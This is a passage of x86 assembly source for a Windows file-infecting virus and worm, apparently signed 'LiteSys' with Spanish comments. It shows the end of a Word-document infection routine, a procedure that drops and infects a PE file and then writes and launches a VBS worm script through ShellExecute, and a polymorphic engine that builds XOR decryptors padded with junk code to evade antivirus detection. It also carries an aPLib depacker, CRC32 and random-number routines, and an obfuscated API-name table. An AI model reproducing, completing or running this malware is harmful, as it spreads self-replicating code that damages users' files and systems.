  ORG $-4
  GuardaEBP2                    DD      00000000h

  PUSH NULL
  CALL [EBX+ExitThread]

  RET

  ENDIF

  @IW_CierraMap:

  PUSH DWO [MHandle_IW]
  APICALL CloseHandle

  @IW_CierraFile:

  PUSH DWO [FHandle_IW]
  APICALL CloseHandle
  JMP @IW_Fin

  ; Convierte un numero a su representacion ASCII en Hex.

  @Hexa:

  PUSH ECX
  PUSH EDI

  XOR ECX, ECX
  MOV CL, AL
  PUSH ECX
  SHR CL, 04h
  LEA EDI, OFS [Tabla_Hex]
  INC CL

  @@Y:
  INC EDI
  DEC CL
  JNZ @@Y

  DEC EDI
  MOV AL, BYTE PTR [EDI]           ; Pasa el numero exacto de la tabla
  POP ECX
  AND CL, 0Fh
  LEA EDI, OFS [Tabla_Hex]
  INC CL

  @@X:
  INC EDI
  DEC CL
  JNZ @@X

  DEC EDI
  MOV AH, BYTE PTR [EDI]           ; Pasa el numero exacto de la tabla
  POP EDI
  POP ECX

  RET 00h

  Infecta_Word   ENDP

; 컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�

  Worm_VBS       PROC Pascal            DeltaOfs:DWORD

  PUSHAD

  MOV EBP, DeltaOfs

  CALL @SEH_4

  MOV ESP, DWORD PTR [ESP+8h]
  JMP @VBS_Fin

  @SEH_4:

  XOR EAX, EAX
  PUSH DWORD PTR FS:[EAX]
  MOV FS:[EAX], ESP

  PUSH PAGE_READWRITE
  PUSH MEM_COMMIT + MEM_RESERVE + MEM_TOP_DOWN
  PUSH MAX_PATH
  PUSH NULL
  APICALL VirtualAlloc
  MOV DWO [VFreeX], EAX
  OR EAX, EAX
  JZ @VBS_Fin

  PUSH MAX_PATH
  PUSH EAX
  APICALL GetWindowsDirectoryA
  OR EAX, EAX
  JZ @VBS_Fin
 
  PUSH DWO [VFreeX]
  APICALL SetCurrentDirectoryA
  OR EAX, EAX
  JZ @VBS_Fin

  PUSH MEM_DECOMMIT
  PUSH MAX_PATH
  PUSH 12345678h
  ORG $-4
  VFreeX                        DD      00000000h
  APICALL VirtualFree

  LEA EBX, OFS [WScript_Exe]
  CALL @Existe_Archivo
  JNC @VBS_Fin

  LEA EBX, OFS [Raxelp_vbs]
  CALL @Existe_Archivo
  JC @VBS_Fin

  PUSH 10d
  POP EBX
  CALL Random
  XCHG ECX, EAX
  LEA EDI, OFS [Nombres_Varios]
  INC ECX
  @VBS1:
  XOR AL, AL
  SCASB
  JNZ @VBS1
  LOOP @VBS1

  PUSH EDI
  @VBS2:
  XOR AL, AL
  INC ECX
  SCASB
  JNZ @VBS2
  DEC ECX
  POP EDI

  MOV BY [LargoVBS], CL
  MOV DWO [GuardaNom], EDI

  MOV EBX, EDI
  CALL Droppear_PE
  JC @VBS_Fin

  MOV EBX, DWO [GuardaNom]
  CALL Infecta_PE
 
  XOR EAX, EAX
  PUSH EAX
  PUSH FILE_ATTRIBUTE_NORMAL
  PUSH CREATE_NEW
  PUSH EAX
  PUSH EAX
  PUSH GENERIC_READ + GENERIC_WRITE
  LEA EAX, OFS [Raxelp_vbs]
  PUSH EAX
  APICALL CreateFileA
  MOV DWO [FHandle_WVBS], EAX
  INC EAX
  JZ @VBS_Fin
  DEC EAX

  XOR EBX, EBX
  PUSH EBX
  PUSH 4096d
  PUSH EBX
  PUSH PAGE_READWRITE
  PUSH EBX
  PUSH EAX
  APICALL CreateFileMappingA
  MOV DWO [MHandle_WVBS], EAX
  OR EAX, EAX
  JZ @VBS_CierraFile

  XOR EBX, EBX
  PUSH EBX
  PUSH EBX
  PUSH EBX
  PUSH FILE_MAP_READ + FILE_MAP_WRITE
  PUSH EAX
  APICALL MapViewOfFile
  MOV DWO [BaseMap_WVBS], EAX
  OR EAX, EAX
  JZ @VBS_DesMapea

  XCHG EDI, EAX
  LEA ESI, OFS [Gusano_VBS]
  PUSH L_Gusano_VBS
  POP ECX
  REP MOVSB

  PUSH EDI
  PUSH MAX_PATH
  PUSH EDI
  APICALL GetWindowsDirectoryA
  OR EAX, EAX
  JZ @VBS_CierraTodo
  POP EDI
  ADD EDI, EAX
  MOV BYTE PTR [EDI], "\"
  INC EDI

  MOV ESI, DWO [GuardaNom]
  MOVZX ECX, BY [LargoVBS]
  REP MOVSB

  LEA ESI, OFS [Gusano_VBS2]
  PUSH L_Gusano_VBS2
  POP ECX
  REP MOVSB
  SUB EDI, DWO [BaseMap_WVBS]

  PUSH DWO [BaseMap_WVBS]
  APICALL UnmapViewOfFile

  PUSH DWO [MHandle_WVBS]
  APICALL CloseHandle

  XOR EBX, EBX
  PUSH EBX
  PUSH EBX
  PUSH EDI
  PUSH DWO [FHandle_WVBS]
  APICALL SetFilePointer

  PUSH DWO [FHandle_WVBS]
  APICALL SetEndOfFile

  PUSH DWO [FHandle_WVBS]
  APICALL CloseHandle

  CALL @VBS3
  DB "SHELL32.DLL", 00h
  @VBS3: APICALL LoadLibraryA
  OR EAX, EAX
  JZ @VBS_Fin

  CALL @VBS4
  DB "ShellExecuteA", 00h, 5 DUP (90h)
  @VBS4: PUSH EAX
  APICALL GetProcAddress
  OR EAX, EAX
  JZ @VBS_Fin

  XOR EBX, EBX
  PUSH EBX
  PUSH EBX
  PUSH EBX
  LEA EDX, OFS [Raxelp_VBS]
  PUSH EDX
  PUSH EBX
  PUSH EBX
  CALL EAX

  @VBS_Fin:

  XOR ECX, ECX
  POP DWORD PTR FS:[ECX]
  POP ECX

  IF DEBUG

  POPAD
  RET

  ELSE

  MOV DWO [GuardaEBP3], EBP
  POPAD

  MOV EBX, 12345678h
  ORG $-4
  GuardaEBP3                    DD      00000000h

  PUSH NULL
  CALL [EBX+ExitThread]
  RET

  ENDIF

  @VBS_CierraTodo:

  PUSH DWO [BaseMap_WVBS]
  APICALL UnmapViewOfFile

  @VBS_DesMapea:

  PUSH DWO [MHandle_WVBS]
  APICALL CloseHandle

  @VBS_CierraFile:

  XOR EBX, EBX
  PUSH EBX
  PUSH EBX
  PUSH DWO [Scriptum]
  PUSH DWO [FHandle_WVBS]
  APICALL SetFilePointer

  PUSH DWO [FHandle_WVBS]
  APICALL SetEndOfFile

  PUSH DWO [FHandle_WVBS]
  APICALL CloseHandle

  JMP @VBS_Fin

  ; Rutina para revisar la existencia de un archivo.
  ; EBX -> Nombre de archivo.
  ; Retorna acarreo si existe

  @Existe_Archivo:

   PUSH EBX
   PUSH PAGE_READWRITE
   PUSH MEM_COMMIT + MEM_RESERVE + MEM_TOP_DOWN
   PUSH SIZEOF_WIN32_FIND_DATA
   PUSH NULL
   APICALL VirtualAlloc
   MOV DWO [VAllocZ], EAX
   OR EAX, EAX
   JZ @EA_Negativo
   POP EBX

   PUSH EAX
   PUSH EBX
   APICALL FindFirstFileA
   INC EAX
   JZ @EA_Negativo

   DEC EAX
   PUSH EAX
   APICALL FindClose

   PUSH MEM_DECOMMIT
   PUSH SIZEOF_WIN32_FIND_DATA
   PUSH 12345678h
   ORG $-4
   VAllocZ              DD      00000000h
   APICALL VirtualFree

   STC
   RET 0
      
   @EA_Negativo:

   PUSH MEM_DECOMMIT
   PUSH SIZEOF_WIN32_FIND_DATA
   PUSH DWO [VAllocZ]
   APICALL VirtualFree

   CLC
   RET 0


  Worm_VBS       ENDP

; 컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�

  DB             "[" XOR 40h
  DB             "D" XOR 40h
  DB             "e" XOR 40h
  DB             "s" XOR 40h
  DB             "i" XOR 40h
  DB             "g" XOR 40h
  DB             "n" XOR 40h
  DB             "e" XOR 40h
  DB             "d" XOR 40h
  DB             " " XOR 40h
  DB             "b" XOR 40h
  DB             "y" XOR 40h
  DB             " " XOR 40h
  DB             "L" XOR 40h
  DB             "i" XOR 40h
  DB             "t" XOR 40h
  DB             "e" XOR 40h
  DB             "S" XOR 40h
  DB             "y" XOR 40h
  DB             "s" XOR 40h
  DB             "]" XOR 40h
  DB                     40h

; 컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�

 ; PXPE: Plexar Polymorphic Engine: Another Lame Poly Written By Me.
 ;
 ; ESI -> Origen
 ; EDI -> Destino
 ; ECX -> Tama쨚

 PXPE           PROC

 MOV DWO [Origen], ESI
 MOV DWO [Destino], EDI
 MOV DWO [Tama쨚], ECX

 CALL @Inicializar_Semillas

 XOR EBX, EBX
 DEC EBX
 CALL @Aleatorio
 MOV DWO [Llave], EAX

 MOV EDI, DWO [Destino]

 ; DELTA

 PUSH EDI
 CALL @Basura
 CALL @Basura
 POP EDX
 SUB EDX, EDI
 MOV DWO [GuardaDelta2], EDX

 MOV AL, 0E8h                            ; CALL
 STOSB
 XOR EAX, EAX                            ; Delta
 STOSD
 CALL @Basura
 CALL @Basura
 CALL @Popear_Delta
 CALL @Basura
 CALL @Basura
 CALL @Meter_Tama쨚
 CALL @Basura
 CALL @Basura

 CALL @Colocar_Lea
 CALL @Basura
 MOV DWO [GuardaLoop], EDI
 CALL @Basura

 MOV AX, 03781h                          ; XOR DWORD PTR [EDI]
 STOSW
 MOV EAX, DWO [Llave]
 STOSD
 CALL @Basura
 CALL @Basura
 CALL @SumaCuatro
 CALL @Basura
 CALL @Basura

 MOV AL, 049h
 STOSB
 MOV AX, 850Fh
 STOSW
 MOV EAX, DWO [GuardaLoop]
 SUB EAX, EDI
 SUB EAX, 04h
 STOSD

 CALL @Basura
 CALL @Basura

 MOV EAX, EDI
 SUB EAX, DWO [Destino]
 SUB EAX, 05h
 MOV EBX, DWO [GuardaDelta]
 SUB DWORD PTR [EBX], EAX
 MOV EDX, DWO [GuardaDelta2]
 SUB DWORD PTR [EBX], EDX

 MOV ESI, DWO [Origen]
 MOV ECX, DWO [Tama쨚]
 MOV EAX, DWO [Llave]

 @ReCopia:
  MOVSD
  XOR DWORD PTR [EDI-4h], EAX
 LOOP @ReCopia

 RET

 @Inicializar_Semillas:

  LEA EDI, OFS [@SaveSemilla]
  RDTSC
  STOSD
  PUSH 04h
  POP EDI
  LEA ESI, OFS [@SaveSemilla]
  CALL CRC32
  MOV DWO [Semilla_1], EAX

  APICALL GetTickCount
  ADD EAX, EAX
  NOT EAX                        ; que mierda...
  PUSH 04h
  POP EDI
  LEA ESI, OFS [@SaveSemilla]
  CALL CRC32
  MOV DWO [Semilla_2], EAX

  RET

 ; Un indecente generador de numeros aleatorios...
 ;
 ; EBX -> Limite.

 @Aleatorio:

  PUSH EDI
  PUSH ECX
  PUSH EDX
  PUSH EBX

  MOV EAX, DWO [Semilla_1]
  IMUL EAX, Mierda_1
  ADD EAX, Mierda_2
  MOV DWO [Semilla_1], EAX

  LEA EDI, OFS [Milonga]
  STOSD

  MOV EBX, DWO [Semilla_2]
  IMUL EBX, Mierda_3
  ADD EBX, Mierda_4
  MOV DWO [Semilla_2], EBX
  XCHG EAX, EBX
  STOSD

  LEA ESI, OFS [Milonga]
  PUSH 08h
  POP EDI
  CALL CRC32

  POP EBX
  XOR EDX, EDX
  DIV EBX

  XCHG EDX, EAX

  POP EDX
  POP ECX
  POP EDI

  RET

  Milonga               DB      9 DUP (00h)

 @Popear_Delta:

  PUSH 04h
  POP EBX
  CALL @Aleatorio
  OR EAX, EAX
  JZ @Popear_Delta_I
  CMP EAX, 01h
  JZ @Popear_Delta_II
  CMP EAX, 02h
  JZ @Popear_Delta_III
  CMP EAX, 03h
  JZ @Popear_Delta_IV

  JMP @Popear_Delta_IV

  @Popear_Delta_R:

  RET

  @Popear_Delta_I:
   MOV AL, 05Dh                                   ; POP EBP
   STOSB
   MOV AX, 0ED81h                                 ; SUB EBP
   STOSW
   MOV DWO [GuardaDelta], EDI
   MOV EAX, DWO [Origen]
   STOSD
   JMP @Popear_Delta_R

  @Popear_Delta_II:
   MOV AL, 058h
   STOSB
   MOV AL, 02Dh
   STOSB
   MOV DWO [GuardaDelta], EDI
   MOV EAX, DWO [Origen]
   STOSD
   MOV AL, 095h
   STOSB
   JMP @Popear_Delta_R

  @Popear_Delta_III:
   MOV AL, 05Bh
   STOSB
   MOV AL, 0BAh
   STOSB
   MOV DWO [GuardaDelta], EDI
   MOV EAX, DWO [Origen]
   STOSD
   MOV AX, 0D329h
   STOSW
   MOV AX, 0DD87h
   STOSW
   JMP @Popear_Delta_R

  @Popear_Delta_IV:
   MOV AL, 05Ah
   STOSB
   MOV AL, 068h
   STOSB
   MOV DWO [GuardaDelta], EDI
   MOV EAX, DWO [Origen]
   STOSD
   MOV AL, 05Dh
   STOSB
   MOV AX, 0D587h
   STOSW
   MOV AX, 0D529h
   STOSW
   JMP @Popear_Delta_R

  RET

  @Meter_Tama쨚:

  PUSH 04h
  POP EBX
  CALL @Aleatorio
  OR EAX, EAX
  JZ @Meter_Tama쨚_I
  CMP EAX, 01h
  JZ @Meter_Tama쨚_II
  CMP EAX, 02h
  JZ @Meter_Tama쨚_III
  CMP EAX, 03h
  JZ @Meter_Tama쨚_IV

  JMP @Meter_Tama쨚_III

  @Meter_Tama쨚R:

  RET

  @Meter_Tama쨚_I:
   MOV AL, 0B9h
   STOSB
   MOV EAX, DWO [Tama쨚]
   STOSD
   JMP @Meter_Tama쨚R

  @Meter_Tama쨚_II:
   MOV AL, 068h
   STOSB
   MOV EAX, DWO [Tama쨚]
   STOSD
   MOV AL, 059h
   STOSB
   JMP @Meter_Tama쨚R

  @Meter_Tama쨚_III:
   MOV AL, 0BAh
   STOSB
   MOV EAX, DWO [Tama쨚]
   NOT EAX
   STOSD
   MOV AX, 0CA87h
   STOSW
   MOV AX, 0D1F7h
   STOSW
   JMP @Meter_Tama쨚R

  @Meter_Tama쨚_IV:
   XOR EBX, EBX
   DEC EBX
   CALL @Aleatorio
   XCHG EDX, EAX

   MOV AL, 068h
   STOSB
   MOV EAX, EDX
   STOSD
   MOV AL, 058h
   STOSB
   MOV AL, 035h
   STOSB
   MOV EAX, DWO [Tama쨚]
   XOR EAX, EDX
   STOSD
   MOV AL, 091h
   STOSB
   JMP @Meter_Tama쨚R

  @Colocar_LEA:

  PUSH 03h
  POP EBX
  CALL @Aleatorio
  OR EAX, EAX
  JZ @Colocar_Lea_I
  CMP EAX, 01h
  JZ @Colocar_Lea_II
  CMP EAX, 02h
  JZ @Colocar_Lea_III

  JMP @Colocar_Lea_II

  @Colocar_LEAR:

  RET

  @Colocar_LEA_I:
   MOV AX, 0BD8Dh
   STOSW
   MOV EAX, DWO [Origen]
   STOSD
   JMP @Colocar_LEAR

  @Colocar_LEA_II:
   MOV AL, 0BFh
   STOSB
   MOV EAX, DWO [Origen]
   STOSD
   MOV AX, 0EF01h
   STOSW
   JMP @Colocar_LEAR

  @Colocar_LEA_III:
   MOV AL, 068h
   STOSB
   MOV EAX, DWO [Origen]
   STOSD
   MOV AL, 05Ah
   STOSB
   MOV AX, 0EA01h
   STOSW
   MOV AX, 0D787h
   STOSW
   JMP @Colocar_LEAR

  @SumaCuatro:

  PUSH 04h
  POP EBX
  CALL @Aleatorio
  OR EAX, EAX
  JZ @SumaCuatro_I
  CMP EAX, 01h
  JZ @SumaCuatro_II
  CMP EAX, 02h
  JZ @SumaCuatro_III
  CMP EAX, 03h
  JZ @SumaCuatro_IV

  JMP @SumaCuatro_III

  @SumaCuatroR:

  RET

  @SumaCuatro_I:
   MOV AX, 0C781h
   STOSW
   MOV EAX, 00000004h
   STOSD
   JMP @SumaCuatroR

  @SumaCuatro_II:
   MOV EAX, 47474747h
   STOSD
   JMP @SumaCuatroR

  @SumaCuatro_III:
   MOV AL, 47h
   STOSB
   MOV AX, 0C781h
   STOSW
   MOV EAX, 00000002h
   STOSD
   MOV AL, 47h
   STOSB
   JMP @SumaCuatroR

  @SumaCuatro_IV:
   MOV AX, 0C781h
   STOSW
   MOV EAX, 00000003h
   STOSD
   MOV AL, 47h
   STOSB
   JMP @SumaCuatroR

  ; Generador de basura! Mega Lamer!!!

  @Basura:

  PUSH 10d
  POP ECX

  @BasLoop:

  PUSH 08d
  POP EBX
  CALL @Aleatorio

  OR EAX, EAX
  JZ @Basura_1
  CMP EAX, 1h
  JZ @Basura_2
  CMP EAX, 2h
  JZ @Basura_3
  CMP EAX, 3h
  JZ @Basura_4
  CMP EAX, 4h
  JZ @Basura_5
  CMP EAX, 5h
  JZ @Basura_6
  CMP EAX, 6h
  JZ @Basura_7

  JMP @Basura_1

  @BasuraR:

  LOOP @BasLoop

  RET

  @Basura_1:

   PUSH 07h
   POP EBX
   CALL @Aleatorio
   LEA ESI, OFS [@B1_Tabla]
   ADD ESI, EAX
   MOVSB

   XOR EBX, EBX
   DEC EBX
   CALL @Aleatorio
   STOSD
   JMP @BasuraR
   
   @B1_Tabla:
    DB 0B8h     ; MOV EAX
    DB 0BBh     ; MOV EBX
    DB 0BAh     ; MOV EDX
    DB 0BEh     ; MOV ESI
    DB 005h     ; ADD EAX
    DB 02Dh     ; SUB EAX
    DB 035h     ; XOR EAX
    DB 015h     ; ADC EAX

  @Basura_2:

   PUSH 15d
   POP EBX
   CALL @Aleatorio
   ADD EAX, EAX
   LEA ESI, OFS [@B2_Tabla]
   ADD ESI, EAX
   MOVSW

   XOR EBX, EBX
   DEC EBX
   CALL @Aleatorio
   STOSD

   JMP @BasuraR

   @B2_Tabla:
    DB 081h, 0C3h      ; ADD EBX
    DB 081h, 0C2h      ; ADD EDX
    DB 081h, 0C6h      ; ADD ESI
    DB 081h, 0EBh      ; SUB EBX
    DB 081h, 0EAh      ; SUB EDX
    DB 081h, 0EEh      ; SUB ESI
    DB 081h, 0F6h      ; XOR ESI
    DB 081h, 0F2h      ; XOR EDX
    DB 081h, 0F3h      ; XOR EBX
    DB 081h, 0D3h      ; ADC EBX
    DB 081h, 0D2h      ; ADC EDX
    DB 081h, 0D6h      ; ADC ESI
    DB 069h, 0C0h      ; IMUL EAX
    DB 069h, 0DBh      ; IMUL EBX
    DB 069h, 0D2h      ; IMUL EDX
    DB 069h, 0F6h      ; IMUL ESI

  @Basura_3:

   PUSH 35d
   POP EBX
   CALL @Aleatorio
   ADD EAX, EAX
   LEA ESI, OFS [@B3_Tabla]
   ADD ESI, EAX
   MOVSW

   JMP @BasuraR

   @B3_Tabla:
    DB 001h, 0D8h      ; ADD EAX, EBX
    DB 001h, 0D0h      ; ADD EAX, EDX
    DB 001h, 0F0h      ; ADD EAX, ESI
    DB 001h, 0D3h      ; ADD EBX, EDX
    DB 001h, 0F3h      ; ADD EBX, ESI
    DB 001h, 0C3h      ; ADD EBX, EAX
    DB 001h, 0DAh      ; ADD EDX, EBX
    DB 001h, 0F2h      ; ADD EDX, ESI
    DB 001h, 0C2h      ; ADD EDX, EAX
    DB 001h, 0DEh      ; ADD ESI, EBX
    DB 001h, 0D6h      ; ADD ESI, EDX
    DB 001h, 0C6h      ; ADD ESI, EAX
    DB 029h, 0D8h      ; SUB EAX, EBX
    DB 029h, 0D0h      ; SUB EAX, EDX
    DB 029h, 0F0h      ; SUB EAX, ESI
    DB 029h, 0C3h      ; SUB EBX, EAX
    DB 029h, 0D3h      ; SUB EBX, EDX
    DB 029h, 0F3h      ; SUB EBX, ESI
    DB 029h, 0C2h      ; SUB EDX, EAX
    DB 029h, 0DAh      ; SUB EDX, EBX
    DB 029h, 0F2h      ; SUB EDX, ESI
    DB 029h, 0C6h      ; SUB ESI, EAX
    DB 029h, 0DEh      ; SUB ESI, EBX
    DB 029h, 0D6h      ; SUB ESI, EDX
    DB 031h, 0D8h      ; XOR EAX, EBX
    DB 031h, 0D0h      ; XOR EAX, EDX
    DB 031h, 0F0h      ; XOR EAX, ESI
    DB 031h, 0C3h      ; XOR EBX, EAX
    DB 031h, 0D3h      ; XOR EBX, EDX
    DB 031h, 0F3h      ; XOR EBX, ESI
    DB 031h, 0C2h      ; XOR EDX, EAX
    DB 031h, 0DAh      ; XOR EDX, EBX
    DB 031h, 0F2h      ; XOR EDX, ESI
    DB 031h, 0C6h      ; XOR ESI, EAX
    DB 031h, 0DEh      ; XOR ESI, EBX
    DB 031h, 0D6h      ; XOR ESI, EDX

  @Basura_4:
   MOV AL, 068h       ; PUSH
   STOSB
   XOR EBX, EBX
   DEC EBX
   CALL @Aleatorio
   STOSD

   PUSH 03h
   POP EBX
   CALL @Aleatorio
   LEA ESI, OFS [@B4_Tabla]
   ADD ESI, EAX
   MOVSB

   JMP @BasuraR

   @B4_Tabla:
    DB 058h        ; POP EAX
    DB 05Bh        ; POP EBX
    DB 05Ah        ; POP EDX
    DB 05Eh        ; POP ESI   

  @Basura_5:
   PUSH 11d
   POP EBX
   CALL @Aleatorio
   LEA ESI, OFS [@B5_Tabla]
   ADD ESI, EAX
   MOVSB

   JMP @BasuraR

   @B5_Tabla:
    DB 040h                          ; inc       eax
    DB 043h                          ; inc       ebx
    DB 042h                          ; inc       edx
    DB 046h                          ; inc       esi
    DB 048h                          ; dec       eax
    DB 04Bh                          ; dec       ebx
    DB 04Ah                          ; dec       edx
    DB 04Eh                          ; dec       esi
    DB 093h                          ; xchg      ebx,eax
    DB 092h                          ; xchg      edx,eax
    DB 096h                          ; xchg      esi,eax
    DB 093h                          ; xchg      ebx,eax
       
  @Basura_6:
   PUSH 13d
   POP EBX
   CALL @Aleatorio
   LEA ESI, OFS [@B6_Tabla]
   ADD EAX, EAX
   ADD ESI, EAX
   MOVSW

   JMP @BasuraR

   @B6_Tabla:
    DB 0F7h, 0D0h                  ; not       eax
    DB 0F7h, 0D3h                  ; not       ebx
    DB 0F7h, 0D2h                  ; not       edx
    DB 0F7h, 0D6h                  ; not       esi
    DB 0F7h, 0D8h                  ; neg       eax
    DB 0F7h, 0DBh                  ; neg       ebx
    DB 0F7h, 0DAh                  ; neg       edx
    DB 0F7h, 0DEh                  ; neg       esi
    DB 087h, 0DAh                  ; xchg      ebx,edx
    DB 087h, 0DEh                  ; xchg      ebx,esi
    DB 087h, 0D3h                  ; xchg      edx,ebx
    DB 087h, 0D6h                  ; xchg      edx,esi
    DB 087h, 0F3h                  ; xchg      esi,ebx
    DB 087h, 0F2h                  ; xchg      esi,edx

  @Basura_7:
   PUSH 31d
   POP EBX
   CALL @Aleatorio
   LEA ESI, OFS [@B7_Tabla]
   ADD EAX, EAX
   ADD ESI, EAX
   MOVSW
   XOR EBX, EBX
   DEC EBX
   CALL @Aleatorio
   STOSB

   JMP @BasuraR

   @B7_Tabla:
    DB 0C1h, 0D0h                  ; rcl       eax
    DB 0C1h, 0D3h                  ; rcl       ebx
    DB 0C1h, 0D2h                  ; rcl       edx
    DB 0C1h, 0D6h                  ; rcl       esi
    DB 0C1h, 0D8h                  ; rcr       eax
    DB 0C1h, 0DBh                  ; rcr       ebx
    DB 0C1h, 0DAh                  ; rcr       edx
    DB 0C1h, 0DEh                  ; rcr       esi
    DB 0C1h, 0C0h                  ; rol       eax
    DB 0C1h, 0C3h                  ; rol       ebx
    DB 0C1h, 0C2h                  ; rol       edx
    DB 0C1h, 0C6h                  ; rol       esi
    DB 0C1h, 0C8h                  ; ror       eax
    DB 0C1h, 0CBh                  ; ror       ebx
    DB 0C1h, 0CAh                  ; ror       edx
    DB 0C1h, 0CEh                  ; ror       esi
    DB 0C1h, 0E0h                  ; shl       eax
    DB 0C1h, 0E3h                  ; shl       ebx
    DB 0C1h, 0E2h                  ; shl       edx
    DB 0C1h, 0E6h                  ; shl       esi
    DB 0C1h, 0F8h                  ; sar       eax
    DB 0C1h, 0FBh                  ; sar       ebx
    DB 0C1h, 0FAh                  ; sar       edx
    DB 0C1h, 0FEh                  ; sar       esi
    DB 0C1h, 0E0h                  ; shl       eax
    DB 0C1h, 0E3h                  ; shl       ebx
    DB 0C1h, 0E2h                  ; shl       edx
    DB 0C1h, 0E6h                  ; shl       esi
    DB 0C1h, 0E8h                  ; shr       eax
    DB 0C1h, 0EBh                  ; shr       ebx
    DB 0C1h, 0EAh                  ; shr       edx
    DB 0C1h, 0EEh                  ; shr       esi

 @SaveSemilla                   DB      8 DUP (00h)

 Semilla_1                      DD      00000000h
 Semilla_2                      DD      00000000h
 Llave                          DD      00000000h

 Origen                         DD      00000000h
 Destino                        DD      00000000h
 Tama쨚                         DD      00000000h

 GuardaDelta                    DD      00000000h
 GuardaDelta2                   DD      00000000h
 GuardaLoop                     DD      00000000h

 Mierda_1                       EQU     1A7FC23Bh
 Mierda_2                       EQU     000028B1h
 Mierda_3                       EQU     974D9DB5h
 Mierda_4                       EQU     0000F3C9h

 PXPE           ENDP

; 컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�

;***************************************************************
;*         aPLib v0.22b  -  the smaller the better :)          *
;*               WASM & TASM assembler depacker                *
;*                                                             *
;*   Copyright (c) 1998-99 by  - Jibz -  All Rights Reserved   *
;***************************************************************

;.386p
;.MODEL flat

;.CODE

;PUBLIC _aP_depack_asm

_aP_depack_asm:
    push   ebp
    mov    ebp, esp
    pushad
    push   ebp

    mov    esi, [ebp + 8]     ; C calling convention
    mov    edi, [ebp + 12]

    cld
    mov    dl, 80h

literal:
    movsb
nexttag:
    call   getbit
    jnc    literal

    xor    ecx, ecx
    call   getbit
    jnc    codepair
    xor    eax, eax
    call   getbit
    jnc    shortmatch
    mov    al, 10h
getmorebits:
    call   getbit
    adc    al, al
    jnc    getmorebits
    jnz    domatch_with_inc
    stosb
    jmp    short nexttag
codepair:
    call   getgamma_no_ecx
    dec    ecx
    loop   normalcodepair
    mov    eax,ebp
    call   getgamma
    jmp    short domatch

shortmatch:
    lodsb
    shr    eax, 1
    jz     donedepacking
    adc    ecx, 2
    mov    ebp, eax
    jmp    short domatch

normalcodepair:
    xchg   eax, ecx
    dec    eax
    shl    eax, 8
    lodsb
    mov    ebp, eax
    call   getgamma
    cmp    eax, 32000
    jae    domatch_with_2inc
    cmp    eax, 1280
    jae    domatch_with_inc
    cmp    eax, 7fh
    ja     domatch

domatch_with_2inc:
    inc    ecx

domatch_with_inc:
    inc    ecx
domatch:
    push   esi
    mov    esi, edi
    sub    esi, eax
    rep    movsb
    pop    esi
    jmp    short nexttag

getbit:
    add     dl, dl
    jnz     stillbitsleft
    mov     dl, [esi]
    inc     esi
    adc     dl, dl
stillbitsleft:
    ret

getgamma:
    xor    ecx, ecx
getgamma_no_ecx:
    inc    ecx
getgammaloop:
    call   getbit
    adc    ecx, ecx
    call   getbit
    jc     getgammaloop
    ret

donedepacking:
    pop    ebp
    sub    edi, [ebp + 12]
    mov    [ebp - 4], edi     ; return unpacked length in eax

    popad
    pop    ebp
    ret

; 컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�

 ; Billy Belcebu's CRC32 calculator.
 ;
 ; CRC32 procedure
 ;  --------------+
 ;
 ; input:
 ;        ESI = Offset where code to calculate begins
 ;        EDI = Size of that code
 ; output:
 ;        EAX = CRC32 of given code
 ;

 CRC32          proc
        cld
        xor     ecx,ecx                         ; Optimized by me - 2 bytes
        dec     ecx                             ; less
        mov     edx,ecx
 NextByteCRC:
        xor     eax,eax
        xor     ebx,ebx
        lodsb
        xor     al,cl
        mov     cl,ch
        mov     ch,dl
        mov     dl,dh
        mov     dh,8
 NextBitCRC:
        shr     bx,1
        rcr     ax,1
        jnc     NoCRC
        xor     ax,08320h
        xor     bx,0EDB8h
 NoCRC: dec     dh
        jnz     NextBitCRC
        xor     ecx,eax
        xor     edx,ebx
        dec     edi                             ; 1 byte less
        jnz     NextByteCRC
        not     edx
        not     ecx
        mov     eax,edx
        rol     eax,16
        mov     ax,cx
        ret
 CRC32          endp

; 컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�

  ; Generador de numeros aleatorios para uso general.
  ;
  ; EBX -> Limite Superior

  Random        PROC

  PUSH ECX EDX EDI EBX

  LEA EDI, OFS [Mariconada]
  RDTSC
  STOSD
  PUSH 04h
  POP EDI
  LEA ESI, OFS [Mariconada]
  CALL CRC32
  XCHG EDX, EAX

  PUSH EDX
  LEA EDI, OFS [Mariconada]
  APICALL GetTickCount
  STOSD
  SUB EDI, 04h
  XCHG EDI, ESI
  PUSH 04h
  POP EDI
  CALL CRC32
  POP EDX

  PUSH EAX
  OR EAX, EDX
  POP ECX
  AND EDX, ECX

  XOR EAX, EDX
 
  POP EBX
  XOR EDX, EDX
  DIV EBX
  XCHG EDX, EAX

  POP EDI EDX ECX
  RET

  Mariconada                    DB      9 DUP (00h)

  Random        ENDP

; 컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�

  ; TABLA!
  ;             
  ; Create           -> 01h
  ; File             -> 02h
  ; Map              -> 03h
  ; View             -> 04h
  ; Close            -> 05h
  ; Get              -> 06h
  ; Set              -> 07h
  ; Find             -> 08h
  ; Virtual          -> 09h
  ; Window           -> 0Ah
  ; Directory        -> 0Bh
  ; Current          -> 0Ch
  ; WaitFor          -> 0Dh
  ; Thread           -> 0Eh

  HThread                       DD      00000000h

  APIs_K32                      DB      01h, 02h, "A", 00h
                                DB      01h, 02h, 03h, "pingA", 00h
                                DB      03h, 04h, "Of", 02h, 00h
                                DB      "Unmap", 04h, "Of", 02h, 00h
                                DB      05h, "Handle", 00h
                                DB      06h, 02h, "Size", 00h
                                DB      07h, 02h, "Pointer", 00h
                                DB      07h, "EndOf", 02h, 00h
                                DB      07h, 02h, "AttributesA", 00h
                                DB      "Write", 02h, 00h
